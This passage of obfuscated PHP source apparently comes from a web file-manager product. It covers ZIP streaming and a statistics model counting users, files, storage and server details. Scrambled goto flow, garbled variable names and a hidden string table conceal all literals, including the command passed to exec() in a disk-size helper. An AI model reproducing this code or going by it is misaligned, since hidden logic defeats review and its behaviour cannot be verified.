Dâ„Á£ßƒ; Dâ„Á£ßƒ: $bº‰¡Ü«İŞ =& $_SERVER[°Óó£ÌİóèÅ]; $b…ª«¤¹È = count($this->files); $ešº¯öƒ¢á = $this->cdr_ofs; goto EÁÁ†î¸; C•ƒÅˆ·ù¶: $this->send($Cñ‘­¾»º); goto cô¿Àä¤Ùí; EÁÁ†î¸: $bì©ò…ÒÏÙ = $this->ofs; $EÄµˆœšŠó = array(array($bº‰¡Ü«İŞ[1453], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($bº‰¡Ü«İŞ[1453], 0), array($bº‰¡Ü«İŞ[1455], $bì©ò…ÒÏÙ + $ešº¯öƒ¢á), array($bº‰¡Ü«İŞ[1453], 1)); $Cñ‘­¾»º = $this->packFields($EÄµˆœšŠó); goto C•ƒÅˆ·ù¶; cô¿Àä¤Ùí: } protected function addCdrEof() { goto FÌ«èĞÜá; cêñ¿±¼ó´: $AŞ÷±£Ã°ª = $this->packFields($b—„…§¤ƒ) . $F‰±ôò‘‹£; $this->send($AŞ÷±£Ã°ª); goto F§ã›²«çš; FÌ«èĞÜá: $cß¬ÛËÀ«• =& $_SERVER[°Óó£ÌİóèÅ]; $c‰áÈ¨¯Â¢ = count($this->files); $dÒĞ…ä·‚Ğ = $this->cdr_ofs; goto eà‡‹Óâ”“; eà‡‹Óâ”“: $cø¡Ôß¥Ç = $this->ofs; $F‰±ôò‘‹£ = $cß¬ÛËÀ«•[33]; $b—„…§¤ƒ = array(array($cß¬ÛËÀ«•[1453], static::CDR_EOF_SIGNATURE), array($cß¬ÛËÀ«•[1454], 0), array($cß¬ÛËÀ«•[1454], 0), array($cß¬ÛËÀ«•[1454], $c‰áÈ¨¯Â¢), array($cß¬ÛËÀ«•[1454], $c‰áÈ¨¯Â¢), array($cß¬ÛËÀ«•[1453], 4294967295), array($cß¬ÛËÀ«•[1453], 4294967295), array($cß¬ÛËÀ«•[1454], strlen($F‰±ôò‘‹£))); goto cêñ¿±¼ó´; F§ã›²«çš: } protected function addCdr() { foreach ($this->files as $A‹Š‰ôÜİÜ) { $this->addCdrFile($A‹Š‰ôÜİÜ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Aº¥‡¨í»­ =& $_SERVER[°Óó£ÌİóèÅ]; $D“ç¡Æ³ôö = $Aº¥‡¨í»­[210]; if ($this->outputName) { $eà¶„ÃœÂ = trim(str_replace(array($Aº¥‡¨í»­[120], $Aº¥‡¨í»­[55], $Aº¥‡¨í»­[102], $Aº¥‡¨í»­[76], $Aº¥‡¨í»­[61], $Aº¥‡¨í»­[494]), $Aº¥‡¨í»­[33], $this->outputName)); $CÃ¯‡œÒÏˆ = rawurlencode($eà¶„ÃœÂ); $D“ç¡Æ³ôö .= "\x3b\40\146\x69\x6c\x65\x6e\x61\x6d\x65\x2a\x3d\165\164\x66\55\70\47\47{$CÃ¯‡œÒÏˆ}"; } $D»Ï•´Ó¾¦ = array($Aº¥‡¨í»­[207] => $Aº¥‡¨í»­[1456], $Aº¥‡¨í»­[1457] => $D“ç¡Æ³ôö, $Aº¥‡¨í»­[1458] => $Aº¥‡¨í»­[1459], $Aº¥‡¨í»­[1460] => $Aº¥‡¨í»­[1461], $Aº¥‡¨í»­[1462] => $Aº¥‡¨í»­[1463]); foreach ($D»Ï•´Ó¾¦ as $d«ÔáÑ÷Öš => $a‰­¦à„) { header($d«ÔáÑ÷Öš . $Aº¥‡¨í»­[647] . $a‰­¦à„); } } protected function send($D­Äƒ ¡) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D­Äƒ ¡); } protected final function dosTime($a‚¢§Š‘ËÒ) { $dé¡¯¦† =& $_SERVER[°Óó£ÌİóèÅ]; $d¨ÉÄ¢²Ï = getdate($a‚¢§Š‘ËÒ); if ($d¨ÉÄ¢²Ï[$dé¡¯¦†[1464]] < 1980) { $d¨ÉÄ¢²Ï = array($dé¡¯¦†[1464] => 1980, $dé¡¯¦†[1465] => 1, $dé¡¯¦†[1466] => 1, $dé¡¯¦†[1467] => 0, $dé¡¯¦†[1468] => 0, $dé¡¯¦†[1469] => 0); } $d¨ÉÄ¢²Ï[$dé¡¯¦†[1464]] -= 1980; return $d¨ÉÄ¢²Ï[$dé¡¯¦†[1464]] << 25 | $d¨ÉÄ¢²Ï[$dé¡¯¦†[1465]] << 21 | $d¨ÉÄ¢²Ï[$dé¡¯¦†[1466]] << 16 | $d¨ÉÄ¢²Ï[$dé¡¯¦†[1467]] << 11 | $d¨ÉÄ¢²Ï[$dé¡¯¦†[1468]] << 5 | $d¨ÉÄ¢²Ï[$dé¡¯¦†[1469]] >> 1; } protected function packFields($D¸ôïìŒÑ¯) { $c´İ£Ç¬£« =& $_SERVER[°Óó£ÌİóèÅ]; $cÓ± ã¤ÓÏ = $c´İ£Ç¬£«[33]; $a©ÛíÒÜá = array(); foreach ($D¸ôïìŒÑ¯ as $eé—£êñ“¦) { $cÓ± ã¤ÓÏ .= $eé—£êñ“¦[0]; $a©ÛíÒÜá[] = $eé—£êñ“¦[1]; } array_unshift($a©ÛíÒÜá, $cÓ± ã¤ÓÏ); return call_user_func_array($c´İ£Ç¬£«[1470], $a©ÛíÒÜá); } protected function filterFilename($d³¼¬àÜ³) { $C¥ğ¬¢”µ =& $_SERVER[°Óó£ÌİóèÅ]; return str_replace(array($C¥ğ¬¢”µ[102], $C¥ğ¬¢”µ[4], $C¥ğ¬¢”µ[181], $C¥ğ¬¢”µ[78], $C¥ğ¬¢”µ[120], $C¥ğ¬¢”µ[692], $C¥ğ¬¢”µ[695], $C¥ğ¬¢”µ[282]), $C¥ğ¬¢”µ[79], $d³¼¬àÜ³); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($bÛØõÉ†) { $BÕšª¨‹öÄ =& $_SERVER[°Óó£ÌİóèÅ]; $B¾ŒÒ»Ø—š = array($BÕšª¨‹öÄ[424] => array($BÕšª¨‹öÄ[29] => $BÕšª¨‹öÄ[1471], $BÕšª¨‹öÄ[272] => array($BÕšª¨‹öÄ[225], $BÕšª¨‹öÄ[465], $BÕšª¨‹öÄ[1472], $BÕšª¨‹öÄ[1473])), $BÕšª¨‹öÄ[1474] => array($BÕšª¨‹öÄ[29] => $BÕšª¨‹öÄ[1475], $BÕšª¨‹öÄ[272] => array($BÕšª¨‹öÄ[225], $BÕšª¨‹öÄ[463], $BÕšª¨‹öÄ[1476], $BÕšª¨‹öÄ[1477], $BÕšª¨‹öÄ[1478]))); if (!isset($B¾ŒÒ»Ø—š[$bÛØõÉ†])) { return !1; } $this->optionType = $B¾ŒÒ»Ø—š[$bÛØõÉ†][$BÕšª¨‹öÄ[29]]; $this->field = $B¾ŒÒ»Ø—š[$bÛØõÉ†][$BÕšª¨‹öÄ[272]]; return !0; } public function listData($cĞÓÖë£ÒÑ = false, $eÈ®Ë…¡äë = "\x6d\x6f\x64\x69\x66\x79\124\x69\155\145", $DğÃ‘‹‘–  = false) { return parent::listData($cĞÓÖë£ÒÑ, $eÈ®Ë…¡äë, $DğÃ‘‹‘– ); } public function trendList($F‰ì»Üç÷) { goto aÏÛ¡ñæ…ç; aÏÛ¡ñæ…ç: $DÏİ–ä¨ğ =& $_SERVER[°Óó£ÌİóèÅ]; $CÛˆ·—î†‰ = $this->listData(); if ($CÛˆ·—î†‰) { $CĞ¯¬Òß¤ = end($CÛˆ·—î†‰); $B•‚·›»šÇ = date($DÏİ–ä¨ğ[1479], strtotime($DÏİ–ä¨ğ[1480])); if ($CĞ¯¬Òß¤[$DÏİ–ä¨ğ[225]] == $B•‚·›»šÇ) { return $CÛˆ·—î†‰; } $C¿È¤ƒôØ­ = strtotime($CĞ¯¬Òß¤[$DÏİ–ä¨ğ[225]]); } goto FŒÄ÷æ½ø”; c¨ÑÕÙ÷²: foreach ($cŒôª±Â÷Û as $B•‚·›»šÇ) { $this->{$aâÎĞÍÈ…à}($B•‚·›»šÇ); } return $this->listData(); goto dáõãáÜÎ; FŒÄ÷æ½ø”: if (!isset($C¿È¤ƒôØ­)) { $Cã¼àœ”½æ = $F‰ì»Üç÷ == $DÏİ–ä¨ğ[424] ? $DÏİ–ä¨ğ[1481] : $DÏİ–ä¨ğ[529]; $C¿È¤ƒôØ­ = Model($Cã¼àœ”½æ)->min($DÏİ–ä¨ğ[195]); } $aâÎĞÍÈ…à = $DÏİ–ä¨ğ[1482] . ucfirst($F‰ì»Üç÷); $cŒôª±Â÷Û = $this->dateList($C¿È¤ƒôØ­); goto c¨ÑÕÙ÷²; dáõãáÜÎ: } private function dateList($bÉ¸¼Òô·ó) { $B—õ‘Áè =& $_SERVER[°Óó£ÌİóèÅ]; $AˆÌœˆŠ…Â = $bÉ¸¼Òô·ó; $BêãŸß¤¦ö = strtotime($B—õ‘Áè[1480]); $aÛ–õ‚Ò˜ = array(); while ($AˆÌœˆŠ…Â <= $BêãŸß¤¦ö) { $aÛ–õ‚Ò˜[] = date($B—õ‘Áè[1479], $AˆÌœˆŠ…Â); $AˆÌœˆŠ…Â = strtotime($B—õ‘Áè[1483], $AˆÌœˆŠ…Â); } return $aÛ–õ‚Ò˜; } public function _recordUser($DÎ§Áí±Ÿ = '') { goto Bã‡¦îç¬; FÁÁÇğºğ‰: $cà§ùîƒç = Model($AëÂÓËš[1481])->where($fÖß‰â½ƒ›)->count($AëÂÓËš[1095]); $fÖß‰â½ƒ›[$AëÂÓËš[29]] = $AëÂÓËš[1486]; $cÂ½ÅÖ³è¯ = Model($AëÂÓËš[1487])->where($fÖß‰â½ƒ›)->count($AëÂÓËš[1488]); goto cÚß¡Œèä; cÚß¡Œèä: $dÕëòà¨×Å = array($AëÂÓËš[225] => $DÎ§Áí±Ÿ, $AëÂÓËš[465] => (int) $a‚‹‹İÑÈ, $AëÂÓËš[1472] => (int) $cà§ùîƒç, $AëÂÓËš[1473] => (int) $cÂ½ÅÖ³è¯); return $this->insert($dÕëòà¨×Å); goto A®È§Ä™ì; Bã‡¦îç¬: $AëÂÓËš =& $_SERVER[°Óó£ÌİóèÅ]; $c§¼ˆ¢øùå = strtotime(date($AëÂÓËš[1484], strtotime($DÎ§Áí±Ÿ))); $DË·éÄŠğ© = strtotime(date($AëÂÓËš[1485], strtotime($DÎ§Áí±Ÿ))); goto Fë ¸Ûğå; Fë ¸Ûğå: $fÖß‰â½ƒ› = array($AëÂÓËš[195] => array($AëÂÓËš[694], $DË·éÄŠğ©)); $a‚‹‹İÑÈ = Model($AëÂÓËš[1481])->where($fÖß‰â½ƒ›)->count($AëÂÓËš[1095]); $fÖß‰â½ƒ›[$AëÂÓËš[195]] = array($AëÂÓËš[332], array($c§¼ˆ¢øùå, $DË·éÄŠğ©)); goto FÁÁÇğºğ‰; A®È§Ä™ì: } public function _recordStore($DïŠ¦ÅâºĞ = '') { goto F¡òæ„ô±ª; dàÍœ¿²„: $AÉ×ˆĞ„Óƒ = Model($e¥šÅŠ‰Ó¤[529])->where($CÄØñ…¡À)->sum($e¥šÅŠ‰Ó¤[86]); $FÜ¬ŒïÒ ° = array($e¥šÅŠ‰Ó¤[225] => $DïŠ¦ÅâºĞ, $e¥šÅŠ‰Ó¤[463] => (int) $a©Ã õ›‹, $e¥šÅŠ‰Ó¤[1476] => (int) $CÛçÁ¢¬åÖ, $e¥šÅŠ‰Ó¤[1477] => (int) $A“Œô‡«µÓ, $e¥šÅŠ‰Ó¤[1478] => (int) $AÉ×ˆĞ„Óƒ); return $this->insert($FÜ¬ŒïÒ °); goto A‘ã¡ÑÀ½; BÇ»´Ã£ßŒ: $CÄØñ…¡À[$e¥šÅŠ‰Ó¤[401]] = 1; $A“Œô‡«µÓ = Model($e¥šÅŠ‰Ó¤[529])->where($CÄØñ…¡À)->sum($e¥šÅŠ‰Ó¤[86]); $CÄØñ…¡À[$e¥šÅŠ‰Ó¤[401]] = 2; goto dàÍœ¿²„; F¡òæ„ô±ª: $e¥šÅŠ‰Ó¤ =& $_SERVER[°Óó£ÌİóèÅ]; $BÍ®‘ÂØ–º = strtotime(date($e¥šÅŠ‰Ó¤[1485], strtotime($DïŠ¦ÅâºĞ))); $CÄØñ…¡À = array($e¥šÅŠ‰Ó¤[195] => array($e¥šÅŠ‰Ó¤[694], $BÍ®‘ÂØ–º)); goto F‡êÂî‹‰¼; F‡êÂî‹‰¼: $CÛçÁ¢¬åÖ = Model($e¥šÅŠ‰Ó¤[419])->where($CÄØñ…¡À)->sum($e¥šÅŠ‰Ó¤[86]); $CÄØñ…¡À[$e¥šÅŠ‰Ó¤[383]] = 0; $a©Ã õ›‹ = Model($e¥šÅŠ‰Ó¤[529])->where($CÄØñ…¡À)->sum($e¥šÅŠ‰Ó¤[86]); goto BÇ»´Ã£ßŒ; A‘ã¡ÑÀ½: } public function trend($Cèšæ‰¶åµ, $f•ÄÉîá³) { goto C½ŞˆÀÆØœ; b¢æ”ê›ä: if (empty($C¿šµ›ñ×²)) { $CØË¿İå—ø = date($cİæÅÜÂœÍ[1479], strtotime($cİæÅÜÂœÍ[1480])); $cª­¦ƒ¹·· = array($cİæÅÜÂœÍ[225] => $CØË¿İå—ø); foreach ($aƒªˆƒÙŠ†[$Cèšæ‰¶åµ] as $b¼¯á‡ß  => $BÈ˜Á˜¹¸) { $cª­¦ƒ¹··[$b¼¯á‡ß ] = 0; } $C¿šµ›ñ×²[] = $cª­¦ƒ¹··; } $bğšîÙ µ¡ = array(); foreach ($C¿šµ›ñ×² as $BÈ˜Á˜¹¸) { if ($Cèšæ‰¶åµ == $cİæÅÜÂœÍ[1474] && $BÈ˜Á˜¹¸[$cİæÅÜÂœÍ[1476]] > $BÈ˜Á˜¹¸[$cİæÅÜÂœÍ[463]]) { $BÈ˜Á˜¹¸[$cİæÅÜÂœÍ[1476]] = $BÈ˜Á˜¹¸[$cİæÅÜÂœÍ[463]]; } foreach ($aƒªˆƒÙŠ†[$Cèšæ‰¶åµ] as $b¼¯á‡ß  => $CÎĞİÑÔÅô) { $CºêéİÇä = array($cİæÅÜÂœÍ[225] => $BÈ˜Á˜¹¸[$cİæÅÜÂœÍ[225]], $cİæÅÜÂœÍ[1001] => $CÎĞİÑÔÅô); $CºêéİÇä[$Fº»·µÌ› [$Cèšæ‰¶åµ]] = isset($BÈ˜Á˜¹¸[$b¼¯á‡ß ]) ? $BÈ˜Á˜¹¸[$b¼¯á‡ß ] : 0; $bğšîÙ µ¡[] = $CºêéİÇä; } } goto AÅÒ„–‚ßÂ; C½ŞˆÀÆØœ: $cİæÅÜÂœÍ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->init($Cèšæ‰¶åµ)) { return !1; } $C¿šµ›ñ×² = $this->trendList($Cèšæ‰¶åµ); goto Dˆƒİğ¬Å§; AÅÒ„–‚ßÂ: return $bğšîÙ µ¡; goto eóõœ¸»; Dˆƒİğ¬Å§: if ($C¿šµ›ñ×² && $f•ÄÉîá³ != $cİæÅÜÂœÍ[1070]) { $F¯½Ôàµ¸¤ = $C¿šµ›ñ×²[0][$cİæÅÜÂœÍ[225]]; $fÎ‡ÑÛŒ‡½ = $this->validDate($f•ÄÉîá³, $F¯½Ôàµ¸¤); $Eâ³„Œˆ¯Ü = array(); $D¿ÔÔÊ£Áô = array_to_keyvalue($C¿šµ›ñ×², $cİæÅÜÂœÍ[225]); foreach ($fÎ‡ÑÛŒ‡½ as $CØË¿İå—ø) { if (isset($D¿ÔÔÊ£Áô[$CØË¿İå—ø])) { $CºêéİÇä = $D¿ÔÔÊ£Áô[$CØË¿İå—ø]; } else { $CºêéİÇä = end($C¿šµ›ñ×²); $CºêéİÇä[$cİæÅÜÂœÍ[225]] = $CØË¿İå—ø; if ($Cèšæ‰¶åµ == $cİæÅÜÂœÍ[424]) { $CºêéİÇä[$cİæÅÜÂœÍ[1472]] = $CºêéİÇä[$cİæÅÜÂœÍ[1473]] = 0; } } $Eâ³„Œˆ¯Ü[] = $CºêéİÇä; } $C¿šµ›ñ×² = $Eâ³„Œˆ¯Ü; } $aƒªˆƒÙŠ† = array($cİæÅÜÂœÍ[424] => array($cİæÅÜÂœÍ[465] => LNG($cİæÅÜÂœÍ[1489]), $cİæÅÜÂœÍ[1472] => LNG($cİæÅÜÂœÍ[1490]), $cİæÅÜÂœÍ[1473] => LNG($cİæÅÜÂœÍ[1491])), $cİæÅÜÂœÍ[1474] => array($cİæÅÜÂœÍ[463] => LNG($cİæÅÜÂœÍ[1492]), $cİæÅÜÂœÍ[1476] => LNG($cİæÅÜÂœÍ[1493]), $cİæÅÜÂœÍ[1477] => LNG($cİæÅÜÂœÍ[1494]), $cİæÅÜÂœÍ[1478] => LNG($cİæÅÜÂœÍ[1495]))); $Fº»·µÌ›  = array($cİæÅÜÂœÍ[424] => $cİæÅÜÂœÍ[1496], $cİæÅÜÂœÍ[1474] => $cİæÅÜÂœÍ[86]); goto b¢æ”ê›ä; eóõœ¸»: } public function validDate($B×Ò¬ÒåªË, $A’—åîò¶) { goto EÎˆô³ˆÌ¥; EÎˆô³ˆÌ¥: $BîÜèÖÑº =& $_SERVER[°Óó£ÌİóèÅ]; $d˜é¥Ú¿¬ä = date($BîÜèÖÑº[1479], strtotime($BîÜèÖÑº[1480])); $FÓ·œ¶ÜÒ· = array($d˜é¥Ú¿¬ä); goto b´ÍÂÜµ’; f‹é‚é§È: return $FÓ·œ¶ÜÒ·; goto CÁêëÃèÉ; b´ÍÂÜµ’: switch ($B×Ò¬ÒåªË) { case $BîÜèÖÑº[1077]: $f½İ¢Ñçğ = mktime(0, 0, 0, date($BîÜèÖÑº[1497]), date($BîÜèÖÑº[1498]) - date($BîÜèÖÑº[962]) + 7 - 7, date($BîÜèÖÑº[1499])); $cÚÊÖ† Ò¿ = 0; do { $fÏÔ›ßÒÅµ = date($BîÜèÖÑº[1479], $f½İ¢Ñçğ - 3600 * 24 * 7 * $cÚÊÖ† Ò¿); $FÓ·œ¶ÜÒ·[] = $fÏÔ›ßÒÅµ; $cÚÊÖ† Ò¿++; } while ($A’—åîò¶ < $fÏÔ›ßÒÅµ); break; case $BîÜèÖÑº[1075]: $cÚÊÖ† Ò¿ = 1; do { $C„˜İíçÁ = date($BîÜèÖÑº[1500], strtotime("\55\40{$cÚÊÖ† Ò¿}\x20\155\157\x6e\164\x68\x73")); $FÓ·œ¶ÜÒ·[] = $C„˜İíçÁ; $cÚÊÖ† Ò¿++; } while ($A’—åîò¶ < $C„˜İíçÁ); break; case $BîÜèÖÑº[1464]: $a‹›Í´éœ = (int) date($BîÜèÖÑº[1499], strtotime($A’—åîò¶)); $aø¬½Åæ£ = (int) date($BîÜèÖÑº[1499]); if ($a‹›Í´éœ >= $aø¬½Åæ£) { break; } for ($a‹›Í´éœ; $a‹›Í´éœ < $aø¬½Åæ£; $a‹›Í´éœ++) { $FÓ·œ¶ÜÒ·[] = $a‹›Í´éœ . $BîÜèÖÑº[1501]; } break; default: break; } if ($A’—åîò¶ > end($FÓ·œ¶ÜÒ·)) { array_pop($FÓ·œ¶ÜÒ·); } sort($FÓ·œ¶ÜÒ·); goto f‹é‚é§È; CÁêëÃèÉ: } public function listTable($bêÉçˆ¤¹) { $fãà°ÊŠ†‰ = ucfirst($bêÉçˆ¤¹); return Model($fãà°ÊŠ†‰)->listData(); } public function option($A¿¸‚”êÙ™) { $eƒ–«Ç”ŞÇ = $_SERVER[°Óó£ÌİóèÅ][1502] . ucfirst($A¿¸‚”êÙ™); return $this->{$eƒ–«Ç”ŞÇ}(); } private function optionUser() { goto Dµ•Â“ÉÍ•; dˆòƒ¯—Ò¾: $aŸ‚ëŞù§ä = strtotime($eÁƒÙğÅ‘ª[1504]); $D–É‹§Ïùó = array($eÁƒÙğÅ‘ª[1505] => array($eÁƒÙğÅ‘ª[695], $aŸ‚ëŞù§ä)); $BôªìÖÊêŠ = (int) Model($eÁƒÙğÅ‘ª[1481])->where($D–É‹§Ïùó)->count($eÁƒÙğÅ‘ª[1095]); goto bÔ†¥ß·ˆà; Dµ•Â“ÉÍ•: $eÁƒÙğÅ‘ª =& $_SERVER[°Óó£ÌİóèÅ]; $D¼Ú²Ø‰Ø… = Model($eÁƒÙğÅ‘ª[1481])->count($eÁƒÙğÅ‘ª[1095]); $bõ¤¡ÛÔ = Model($eÁƒÙğÅ‘ª[1481])->where($eÁƒÙğÅ‘ª[1503])->count($eÁƒÙğÅ‘ª[1095]); goto dˆòƒ¯—Ò¾; bºİí¢õ¬¦: $aóÀ»°ã¡‡ = Model($eÁƒÙğÅ‘ª[1481])->where($D–É‹§Ïùó)->count($eÁƒÙğÅ‘ª[1095]); return array($eÁƒÙğÅ‘ª[460] => (int) $D¼Ú²Ø‰Ø…, $eÁƒÙğÅ‘ª[1506] => (int) ($D¼Ú²Ø‰Ø… - $bõ¤¡ÛÔ), $eÁƒÙğÅ‘ª[1507] => (int) $bõ¤¡ÛÔ, $eÁƒÙğÅ‘ª[1508] => (int) $aóÀ»°ã¡‡, $eÁƒÙğÅ‘ª[1509] => $BôªìÖÊêŠ); goto e¡Ã±äÎ—; bÔ†¥ß·ˆà: if (!$BôªìÖÊêŠ) { $BôªìÖÊêŠ = 1; } $aŸ‚ëŞù§ä = strtotime(date($eÁƒÙğÅ‘ª[1484])); $D–É‹§Ïùó = array($eÁƒÙğÅ‘ª[1505] => array($eÁƒÙğÅ‘ª[695], $aŸ‚ëŞù§ä)); goto bºİí¢õ¬¦; e¡Ã±äÎ—: } private function optionFile() { goto BŠğ¤¾«Šİ; C±¬¿Ù“ß: $c¥‚‘Ğ‘Š¯ = Model($Aääò“¸­ê[529])->where($aƒ›«·“µ)->sum($Aääò“¸­ê[86]); $bØ”ÔØÕ‘ = Model($Aääò“¸­ê[529])->where($aƒ›«·“µ)->count($Aääò“¸­ê[382]); return array($Aääò“¸­ê[463] => $FŞ·™‰½çÃ, $Aääò“¸­ê[1476] => $EÏÑ‘Áš‚, $Aääò“¸­ê[1510] => $FŞ·™‰½çÃ - $EÏÑ‘Áš‚, $Aääò“¸­ê[1511] => (int) $c¥‚‘Ğ‘Š¯, $Aääò“¸­ê[465] => (int) $e°•È•Š‡ƒ, $Aääò“¸­ê[1512] => (int) $bØ”ÔØÕ‘); goto F´Ü†ïª¥¡; BŠğ¤¾«Šİ: $Aääò“¸­ê =& $_SERVER[°Óó£ÌİóèÅ]; $a„‘³¤ˆš´ = $this->sourceSize(); $FŞ·™‰½çÃ = $a„‘³¤ˆš´[$Aääò“¸­ê[86]]; goto DÜÚ“ø¥Ã; DÜÚ“ø¥Ã: $EÏÑ‘Áš‚ = $a„‘³¤ˆš´[$Aääò“¸­ê[1476]]; $e°•È•Š‡ƒ = Model($Aääò“¸­ê[529])->where(array($Aääò“¸­ê[383] => 0))->count($Aääò“¸­ê[382]); $aƒ›«·“µ = array($Aääò“¸­ê[383] => 0, $Aääò“¸­ê[195] => array($Aääò“¸­ê[695], strtotime(date($Aääò“¸­ê[1484])))); goto C±¬¿Ù“ß; F´Ü†ïª¥¡: } private function optionAccess() { $c¶¶à·…Òƒ =& $_SERVER[°Óó£ÌİóèÅ]; return array($c¶¶à·…Òƒ[460] => $this->typeLogCnt(), $c¶¶à·…Òƒ[98] => $this->typeLogCnt($c¶¶à·…Òƒ[98]), $c¶¶à·…Òƒ[1513] => $this->typeLogCnt($c¶¶à·…Òƒ[1513]), $c¶¶à·…Òƒ[1514] => $this->typeLogCnt($c¶¶à·…Òƒ[1514]), $c¶¶à·…Òƒ[1515] => $this->typeLogCnt($c¶¶à·…Òƒ[1515]), $c¶¶à·…Òƒ[424] => $this->typeLogCnt($c¶¶à·…Òƒ[33], $c¶¶à·…Òƒ[1488])); } private function typeLogCnt($Cğôæš’ãµ = '', $e²ÓƒŠ¤ = "\151\144") { goto c©ó¡ëš‚; c©ó¡ëš‚: $dö¡ÂƒÅ° =& $_SERVER[°Óó£ÌİóèÅ]; $D†‘¢Œô©¿ = array($dö¡ÂƒÅ°[98] => array($dö¡ÂƒÅ°[1516], $dö¡ÂƒÅ°[1517]), $dö¡ÂƒÅ°[1513] => array($dö¡ÂƒÅ°[1518]), $dö¡ÂƒÅ°[1514] => array($dö¡ÂƒÅ°[1519], $dö¡ÂƒÅ°[1520]), $dö¡ÂƒÅ°[1515] => array($dö¡ÂƒÅ°[1521], $dö¡ÂƒÅ°[1522]), $dö¡ÂƒÅ°[1523] => array($dö¡ÂƒÅ°[1524], $dö¡ÂƒÅ°[1525], $dö¡ÂƒÅ°[1526])); $D”Ÿ«•®÷ = strtotime(date($dö¡ÂƒÅ°[1484])); goto E›ªã·ŸŒ; C…Â¶í‰š: return (int) $DÌŒ²ø¿–™; goto eñˆÔ‚’“Æ; E›ªã·ŸŒ: $aù×‡©É = array($dö¡ÂƒÅ°[195] => array($dö¡ÂƒÅ°[695], $D”Ÿ«•®÷)); if ($Cğôæš’ãµ) { $aù×‡©É[$dö¡ÂƒÅ°[29]] = array($dö¡ÂƒÅ°[7], $D†‘¢Œô©¿[$Cğôæš’ãµ]); } $DÌŒ²ø¿–™ = Model($dö¡ÂƒÅ°[1487])->where($aù×‡©É)->count($e²ÓƒŠ¤); goto C…Â¶í‰š; eñˆÔ‚’“Æ: } private function optionServer() { goto Bá—¨Â¥Ã´; B¹‡Œƒ™Ø: $A—Ò»óÚæ˜ = $f¡ÔøëÀ[0]; $Dî°¨ó· = $GLOBALS[$f”ŒÕæí¡„[6]][$f”ŒÕæí¡„[17]]; $D÷õéœ‘Óò = $Dî°¨ó·[$f”ŒÕæí¡„[498]]; goto F¬ˆÔœ±¯; F¬ˆÔœ±¯: if ($D÷õéœ‘Óò == $f”ŒÕæí¡„[499]) { $cº½ô´ = explode($f”ŒÕæí¡„[500], $Dî°¨ó·[$f”ŒÕæí¡„[501]]); $D÷õéœ‘Óò = $cº½ô´[0]; } if ($D÷õéœ‘Óò == $f”ŒÕæí¡„[591] || $D÷õéœ‘Óò == $f”ŒÕæí¡„[481]) { $D¼ì«¯³§Ú = Model()->db()->query($f”ŒÕæí¡„[1527]); $Fè†ÏÔöº = $D¼ì«¯³§Ú[0] && isset($D¼ì«¯³§Ú[0][$f”ŒÕæí¡„[1000]]) ? $D¼ì«¯³§Ú[0][$f”ŒÕæí¡„[1000]] : 0; $D÷õéœ‘Óò = $f”ŒÕæí¡„[1528] . ($Fè†ÏÔöº ? $f”ŒÕæí¡„[8] . $Fè†ÏÔöº : $f”ŒÕæí¡„[33]); } $fÏ¹šŠô÷ = $GLOBALS[$f”ŒÕæí¡„[6]][$f”ŒÕæí¡„[348]][$f”ŒÕæí¡„[530]]; goto D‚­ÉÔˆ²; Bá—¨Â¥Ã´: $f”ŒÕæí¡„ =& $_SERVER[°Óó£ÌİóèÅ]; $f¸„‰ƒĞ¯¶ = $this->diskDriver(); $dÇ•ˆÄ±´Ñ = KodIO::defaultDriver(); goto dÃÓºŞƒµÂ; dÃÓºŞƒµÂ: $b§Æ»Ü­½ = array($f”ŒÕæí¡„[488] => $dÇ•ˆÄ±´Ñ[$f”ŒÕæí¡„[376]]); $a¤ÜËØ˜„ = Model($f”ŒÕæí¡„[419])->where($b§Æ»Ü­½)->sum($f”ŒÕæí¡„[86]); $f¡ÔøëÀ = explode($f”ŒÕæí¡„[50], $_SERVER[$f”ŒÕæí¡„[144]]); goto B¹‡Œƒ™Ø; D‚­ÉÔˆ²: return array($f”ŒÕæí¡„[1529] => $f¸„‰ƒĞ¯¶ ? $f¸„‰ƒĞ¯¶[$f”ŒÕæí¡„[1530]] : 0, $f”ŒÕæí¡„[1531] => $f¸„‰ƒĞ¯¶ ? $f¸„‰ƒĞ¯¶[$f”ŒÕæí¡„[1532]] : 0, $f”ŒÕæí¡„[1533] => (int) $dÇ•ˆÄ±´Ñ[$f”ŒÕæí¡„[1530]] * 1024 * 1024 * 1024, $f”ŒÕæí¡„[1534] => (int) $a¤ÜËØ˜„, $f”ŒÕæí¡„[1535] => ucfirst($A—Ò»óÚæ˜), $f”ŒÕæí¡„[1536] => $f”ŒÕæí¡„[1537] . PHP_VERSION, $f”ŒÕæí¡„[1538] => phpBuild64() ? 64 : 32, $f”ŒÕæí¡„[459] => str_replace($f”ŒÕæí¡„[1539], $f”ŒÕæí¡„[671], $D÷õéœ‘Óò), $f”ŒÕæí¡„[348] => ucfirst($fÏ¹šŠô÷), $f”ŒÕæí¡„[28] => $_SERVER[$f”ŒÕæí¡„[1540]]); goto a¼½‹Ò­Èš; a¼½‹Ò­Èš: } private function diskDriver() { goto bÍß‰ÌÃ¤Œ; Dîæ‹‚¼¬: if ($DÚù Ì‚ƒ) { $D“£ø¸íãÉ = $e¹ê„ƒŞ®[1543]; if (function_exists($e¹ê„ƒŞ®[1544])) { exec($e¹ê„ƒŞ®[1545], $DÑØÔ“Ö); $D“£ø¸íãÉ = $DÑØÔ“Ö[1] . $e¹ê„ƒŞ®[8]; } } if (!file_exists($D“£ø¸íãÉ)) { return; } $b²¶¶š´’Î = @disk_total_space($D“£ø¸íãÉ); goto BÄœ¼‘á÷; BÄœ¼‘á÷: $AÔ” ôï = $b²¶¶š´’Î - @disk_free_space($D“£ø¸íãÉ); return array($e¹ê„ƒŞ®[1530] => $b²¶¶š´’Î, $e¹ê„ƒŞ®[1532] => $AÔ” ôï); goto eÖœßà¸ ¢; bÍß‰ÌÃ¤Œ: $e¹ê„ƒŞ® =& $_SERVER[°Óó£ÌİóèÅ]; $D“£ø¸íãÉ = $e¹ê„ƒŞ®[8]; $DÚù Ì‚ƒ = $GLOBALS[$e¹ê„ƒŞ®[6]][$e¹ê„ƒŞ®[1541]] == $e¹ê„ƒŞ®[1542]; goto Dîæ‹‚¼¬; eÖœßà¸ ¢: } public function 